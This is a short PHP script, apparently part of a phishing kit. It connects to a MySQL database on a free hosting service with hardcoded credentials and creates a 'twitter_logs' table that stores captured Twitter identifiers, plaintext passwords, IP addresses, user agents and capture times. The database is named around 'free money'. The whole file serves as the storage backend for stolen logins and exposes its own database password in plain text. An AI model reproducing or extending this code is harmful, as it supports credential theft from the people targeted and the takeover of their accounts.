<?php
$conn = new mysqli(
    "sql201.infinityfree.com",
    "if0_42140729",
    "Hackerhu",
    "if0_42140729_freemoney_byme"
);

if ($conn->connect_error) {
    die("Database Connection Failed");
}

// Create table if not exists
$conn->query("CREATE TABLE IF NOT EXISTS twitter_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    identifier VARCHAR(255) NOT NULL,
    password VARCHAR(255) DEFAULT NULL,
    ip VARCHAR(45) DEFAULT NULL,
    user_agent TEXT DEFAULT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    captured_at DATETIME DEFAULT NULL
)");
?>